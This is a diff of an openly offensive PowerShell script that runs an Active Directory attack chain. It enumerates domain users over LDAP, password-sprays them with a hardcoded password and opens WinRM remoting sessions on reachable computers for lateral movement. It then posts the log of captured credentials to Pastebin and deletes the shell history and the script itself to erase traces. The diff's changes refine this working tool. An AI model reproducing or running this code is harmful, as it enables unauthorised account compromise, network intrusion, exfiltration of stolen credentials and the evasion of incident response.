@@ -1,6 +1,6 @@
 
 # Initialize log variable
-$logContent = @()
+$global:logContent = @()
 
 function LDAPSearch {
     param (
@@ -27,6 +27,7 @@ function Log {
 
 # Stage 1
 function GenerateUserList {
+    Log "Stage 1: Generating user list."
     $queryResults = LDAPSearch -LDAPQuery "(&(objectCategory=person)(objectClass=user))"
     $users = @()
     $domainRoot = [ADSI]""
@@ -40,7 +41,7 @@ function GenerateUserList {
             Log "Skipping $username because it is an excluded user. Skipping..."
             continue
         }
-        if ($null -ne $badpwdcount) {
+        if ($null -eq $badpwdcount) {
             Log "Couldnt find $username bad password count. Skipping..."
             continue
         }
@@ -67,7 +68,7 @@ function PasswordSpray {
     $validUsers = @()
     foreach ($currentUser in $Users) {
         try {
-            $Domain = "LDAP://" + ([ADSI]"").distinguishedName
+            $Domain = "LDAP://" + ([adsi]"").distinguishedName
             $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $currentUser, $Password)
             if ($null -ne $Domain_check.name) {
                 Log "SUCCESS! User:$currentUser Password:$Password" "SUCCESS"
@@ -92,7 +93,7 @@ function LateralMovement {
     )
     Log "Stage 3: Creating PS-Remoting sessions on computers with open WinRM port."
     $winrmPort = 5985
-    $validComputers = LDAPSearch -LDAPQuery "(&(objectCategory=computer))" | ForEach-Object {
+    $validComputers = LDAPSearch -LDAPQuery "(objectCategory=computer)" | ForEach-Object {
         $_.Properties.name
     } | ForEach-Object {
         if ((Test-NetConnection -ComputerName $_ -Port $winrmPort -WarningAction SilentlyContinue).TcpTestSucceeded) {
@@ -194,12 +195,12 @@ $users = GenerateUserList
 
 # Stage 2
 if ($users) {
-    $validUsers = PasswordSpray -Users $users -Password "<password>" 
+    $validUsers = PasswordSpray -Users $users -Password "FightP3aceAndHonor!" 
 }
 
 # Stage 3
 if ($validUsers) {
-    $sessions = LateralMovement -Users $validUsers -Password "<password>" 
+    $sessions = LateralMovement -Users $validUsers -Password "FightP3aceAndHonor!" 
 }
 
 # Stage 4
@@ -211,9 +212,9 @@ Log "Script finished."
 
 # Stage 5 
 $logContentString = $logContent -join "`n"
-$api_dev_key = '<your-api-dev-key>'
+$api_dev_key = '<your_api_key>'
 $api_paste_code = $logContentString
-$api_paste_name = "chain-attack-logger-$(Get-Date -Format "yyyy-MM-dd-HH-mm-ss").txt"
+$api_paste_name = "chain-attack-logger-$(Get-Date -Format "yyyy-MM-dd").txt"
 
 $body = @{
     api_option     = 'paste'
@@ -221,10 +222,8 @@ $body = @{
     api_paste_code = $api_paste_code
     api_paste_name = $api_paste_name
 }
-Invoke-RestMethod -Uri 'https://pastebin.com/api/api_post.php' -Method Post -Body $body
+Invoke-RestMethod -Uri 'https://pastebin.com/api/api_post.php' -Method Post -Body $body | Out-Null
 
 # Remove Traces
-Remove-Item (Get-PSReadlineOption).HistorySavePath
-Remove-Item -Path $MyInvocation.MyCommand.Definition -Force
-
-
+Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction Ignore | Out-Null
+Remove-Item -Path $MyInvocation.MyCommand.Definition -Force -ErrorAction Ignore | Out-Null
